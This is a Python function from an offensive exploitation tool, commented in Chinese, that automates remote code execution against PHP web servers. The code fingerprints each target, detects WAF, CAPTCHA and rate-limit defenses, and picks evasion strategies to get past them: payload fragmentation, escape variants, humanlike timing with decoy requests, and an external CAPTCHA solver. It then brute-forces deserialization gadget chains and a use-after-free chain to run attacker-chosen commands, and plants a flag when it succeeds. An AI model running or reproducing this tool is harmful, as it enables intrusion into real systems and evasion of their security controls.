def run_target(url: str, cfg: argparse.Namespace) -> Dict:
    t = HttpTarget(url, timeout=cfg.timeout, verify_tls=cfg.verify_tls)
    result: Dict = {"target": t.url, "verdict": "inconclusive", "chains": []}
    token = rand_token()
    cmd = cfg.cmd if cfg.cmd else "echo %s" % token
    # expect 候选集：自定义命令时取 token+末词双候选，消除假阴性
    if cfg.expect:
        expect = [cfg.expect]
    elif cfg.cmd:
        expect = [token] + ([cmd.split()[-1]] if len(cmd.split()) > 1 else [])
    else:
        expect = token

    try:
        t, hops = resolve_redirects(t)     # 自动跟随 30x（http->https / CDN 跳转）
        if hops:
            result["redirects"] = hops
            result["target_final"] = t.url
        fp = check_one(t)
    except Exception as e:
        result.update(verdict="unreachable", error=str(e))
        return result
    result["fingerprint"] = fp
    if fp["status"] == "patched" and not cfg.force:
        result["verdict"] = "skipped_patched"
        return result

    # 防御体系精准识别（云WAF/人机验证/安全策略/本地WAF/语义识别/频控）
    try:
        result["defense"] = defense_audit(t)
        defense_profile = result["defense"]["profile"]
    except Exception as e:
        result["defense"] = {"error": str(e)}
        defense_profile = fp.get("waf", "unknown")

    # 按识别结果选策略优先级表（多层堆叠 -> 并集逐一尝试；--try-all -> 全量序列）
    layers_hit = result["defense"].get("layers", [])
    if getattr(cfg, "try_all", False):
        profile = ALL_STRATEGIES
    elif any(l.get("layer") == "waf_stacked" for l in layers_hit):
        profile = BYPASS_PROFILES["stacked"]
    else:
        profile = BYPASS_PROFILES.get(defense_profile,
                                      BYPASS_PROFILES.get(fp.get("waf", "unknown"), DEFAULT_PROFILE))
    engine = BypassEngine(level=cfg.bypass_level, cookie=cfg.cookie, profile=profile)
    engine.seed_mode = getattr(cfg, "seed_mode", "abort")
    # 体积规则命中 -> 自动强制流式分片 + 压缩载荷体（实证绕过 ~2KB 限制）
    if any(l.get("layer") == "size_limit" for l in result["defense"].get("layers", [])):
        engine.profile = ["serp_frag"] + [s for s in profile if s != "serp_frag"]
        engine.body_budget = 96
        result["adaptive"] = "size_limit->frag_stream"
    # 语义规则命中 -> 自动前置 '+' 长度/S: 转义变体（实测 403->404，PHP>=7.2 语义成立）
    if any(l.get("layer") == "semantic" for l in result["defense"].get("layers", [])):
        engine.profile = (BYPASS_PROFILES["semantic_block"]
                          + [s for s in engine.profile
                             if s not in BYPASS_PROFILES["semantic_block"]])
        result["adaptive"] = ((result.get("adaptive") + ";" if result.get("adaptive") else "")
                              + "semantic->plus_len/serp_hex")
    result["waf_profile"] = defense_profile
    if fp.get("challenge") or any(l.get("layer") == "human_challenge"
                                  for l in result["defense"].get("layers", [])):
        result["pre_challenge"] = True

    def auto_flag(sp_: str, tp_: str, gad_: str, prop_: str) -> None:
        """绕过成功后的自动后续操作：落地 flag 并回显验证（独立引擎，首选稳定变体）。"""
        fc = getattr(cfg, "flag_cmd", None)
        if not fc:
            return
        feng = BypassEngine(level=cfg.bypass_level, cookie=cfg.cookie,
                            profile=engine.profile, )
        feng.warmed_cookies = list(engine.warmed_cookies)
        flog = chain_hijack(t, sp_, tp_, gad_, prop_, fc,
                            expect=getattr(cfg, "flag_expect", None) or "hello word",
                            engine=feng)
        result["flag_stage"] = {"cmd": fc, "rce_hit": flog.get("rce_hit"),
                                "error": flog.get("error"),
                                "body": flog.get("body", "")[:500]}

    # 预热：采集 WAF 追踪 Cookie
    if cfg.warmup:
        try:
            result["warmup"] = warmup(t, engine)
        except Exception as e:
            result["warmup"] = {"error": str(e)}

    # 挑战求解：调用外部 solver 取放行 Cookie（滑块/人机层）
    if cfg.solver_cmd and (fp.get("challenge") or fp.get("waf") != "unknown"):
        sol = solve_challenge(t, cfg.solver_cmd,
                              "; ".join(engine.warmed_cookies), fp.get("waf", "unknown"))
        result["solver"] = sol
        if sol.get("cookie"):
            engine.cookie = sol["cookie"]

    seeds = load_lines(cfg.seed_wordlist) or SEED_CANDIDATES
    triggers = load_lines(cfg.trigger_wordlist) or TRIGGER_CANDIDATES
    # 端点探测用一次性引擎（始终 plain），不消耗正式射击的绕过策略序列
    probe_engine = BypassEngine(level=0)
    seed_probes = probe_paths(t, seeds, probe_engine)
    trig_probes = probe_paths(t, triggers, probe_engine)
    result["discovery"] = {"seed": seed_probes[:6], "trigger": trig_probes[:6]}
    seed_paths = [p["path"] for p in seed_probes if p.get("score", 0) > 0] or seeds[:3]
    trig_paths = [p["path"] for p in trig_probes if p.get("score", 0) > 0] or triggers[:3]

    gadgets = load_lines(cfg.gadget_wordlist) or GADGET_CANDIDATES
    props = load_lines(cfg.prop_wordlist) or PROP_CANDIDATES
    matrix = build_gadget_matrix(trig_probes, gadgets, props)

    try:
        result["chains"].append(chain_inject(t, trig_paths[0],
                                             engine=BypassEngine(0)))  # 不消耗射击序列
    except Exception as e:
        result["chains"].append({"chain": "inject", "error": str(e)})

    variants = PROGRESS_VALUE_VARIANTS if not cfg.variant else [cfg.variant]
    attempts = 0
    outer = False
    seed_403 = 0
    jitter = getattr(cfg, "jitter", 2.0)
    seen_pass = False
    for sp in ([cfg.seed_path] if cfg.seed_path else seed_paths):
        if outer:
            break
        for tp in ([cfg.trigger_path] if cfg.trigger_path else trig_paths):
            if outer:
                break
            for gadget, prop in matrix:
                for variant in variants:
                    attempts += 1
                    if attempts > cfg.max_attempts:
                        outer = True
                        break
                    # ML/行为对抗：拟人抖动 + 干净诱饵稀释异常占比（实证突发预算会临时封禁）
                    if cfg.bypass_level >= 3 and attempts > 1:
                        time.sleep(random.uniform(jitter, jitter * 2))
                    if cfg.bypass_level >= 3 and attempts % 3 == 1:
                        try:
                            t.request("GET", "/", headers={"User-Agent": UA_POOL[0]})
                        except Exception:
                            pass
                    try:
                        log = chain_hijack(t, sp, tp, gadget, prop, cmd,
                                           variant=variant, expect=expect,
                                           monitor_url=cfg.monitor_url, engine=engine)
                    except Exception as e:
                        log = {"chain": "hijack", "error": str(e)}
                    result["chains"].append(log)
                    # 自适应：seed POST 遭边缘封禁(403/520/502/503) -> 切换定向变形模板
                    seed_http = (log.get("steps") or [{}])[0].get("http") \
                        if isinstance(log.get("steps"), list) and log["steps"] else None
                    if seed_http in (403, 502, 503, 520):
                        seed_403 += 1
                        if seen_pass:
                            jitter = min(jitter * 1.5, 30.0)   # 突发预算触顶 -> 自动退避
                    elif seed_http:
                        seen_pass = True
                    if seed_http in (403, 502, 503, 520):
                        seed_403 += 1
                        if (seed_403 >= 2 and cfg.bypass_level >= 2
                                and engine.profile is not BYPASS_PROFILES["post_403"]):
                            engine.profile = BYPASS_PROFILES["post_403"]
                            engine.idx = 0
                            result["adaptive"] = "profile->post_403 @attempt %d" % attempts
                    if log.get("rce_hit"):
                        auto_flag(sp, tp, gadget, prop)      # 自动后续：flag 落地+验证
                        result.update(verdict="rce_confirmed",
                                      via="hijack:%s:%s:%s" % (sp, tp, gadget))
                        return result
                    if log.get("armed"):
                        result.update(verdict="armed", via="hijack:%s" % sp)

    if not cfg.no_uaf:
        res = resolve_call_addr(
            binary=cfg.binary,
            zval_dtor_addr=int(cfg.zval_dtor_addr, 16) if cfg.zval_dtor_addr else None,
            delta_name=cfg.delta, server_banner=fp.get("server") or "")
        if res.get("call_addr"):
            offsets = [int(cfg.offset, 16)] if cfg.offset else [0, 0x80, 0x930, 0x1000]
            for stall in (cfg.stall, 2.5):
                for off in offsets:
                    try:
                        log = chain_uaf(t, trig_paths[0], res["call_addr"], off, cmd,
                                        stall=stall, expect=expect,
                                        monitor_url=cfg.monitor_url, engine=engine)
                    except Exception as e:
                        log = {"chain": "uaf", "error": str(e)}
                    log["addr_source"] = res["source"]
                    result["chains"].append(log)
                    if log.get("rce_hit"):
                        auto_flag(trig_paths[0], trig_paths[0], "Gadget", "cmd")
                        result.update(verdict="rce_confirmed", via="uaf:%s" % trig_paths[0])
                        return result
            if result["verdict"] == "inconclusive" and any(
                    c.get("crash_signal") for c in result["chains"] if c.get("chain") == "uaf"):
                result["verdict"] = "crash_signal"
        else:
            result["uaf_skipped"] = "CALL_ADDR 未提供且无法自动解析"

    # 判定：挑战页拦截 / POST 方法封禁 / 漏洞面不可达
    if result["verdict"] == "inconclusive":
        challenged = sum(1 for c in result["chains"]
                         if c.get("challenge_blocked") or c.get("error"))
        hijack_logs = [c for c in result["chains"] if c.get("chain") == "hijack"]
        seed_blocked = [c for c in hijack_logs
                        if isinstance(c.get("steps"), list) and c["steps"]
                        and c["steps"][0].get("http") in (403, 502, 503, 520)]
        fire_ok = [c for c in hijack_logs
                   if isinstance(c.get("steps"), list) and len(c["steps"]) > 1
                   and c["steps"][1].get("http") == 200]
        seed_ok = [c for c in hijack_logs
                   if isinstance(c.get("steps"), list) and c["steps"]
                   and 200 <= c["steps"][0].get("http", 0) < 300]
        if len(seed_blocked) >= 2 and len(fire_ok) >= 2 and not seed_ok:
            # GET 放行而 POST 无一成功 -> 边缘按方法策略拦截，载荷变形无解
            result["verdict"] = "post_blocked"
            result["post_block_codes"] = sorted({c["steps"][0]["http"]
                                                 for c in seed_blocked})
        elif fp.get("challenge") and challenged >= max(1, len(result["chains"]) - 1):
            result["verdict"] = "challenge_blocked"
        elif fp["status"] in ("likely_vulnerable", "eol_or_unknown"):
            result["verdict"] = "likely_vulnerable_no_rce"

    # 挑战拦截且配置了求解器：换新 Cookie 再打一轮矩阵（最多 2 次求解）
    if result["verdict"] == "challenge_blocked" and cfg.solver_cmd:
        sol2 = solve_challenge(t, cfg.solver_cmd + " --retry",
                               "; ".join(engine.warmed_cookies), fp.get("waf", "unknown"))
        result["solver_retry"] = sol2
        if sol2.get("cookie"):
            engine.cookie = sol2["cookie"]
            engine.idx = 0                     # 策略序列重置，重新打矩阵
            result["chains"].append({"chain": "hijack", "note": "solver-retry-resumed"})
            for sp in seed_paths[:2]:
                for tp in trig_paths[:2]:
                    for gadget, prop in matrix[:6]:
                        try:
                            log = chain_hijack(t, sp, tp, gadget, prop, cmd,
                                               expect=expect, engine=engine)
                        except Exception as e:
                            log = {"chain": "hijack", "error": str(e)}
                        result["chains"].append(log)
                        if log.get("rce_hit"):
                            auto_flag(sp, tp, gadget, prop)
                            result.update(verdict="rce_confirmed",
                                          via="hijack(solver):%s:%s:%s" % (sp, tp, gadget))
                            return result
    return result


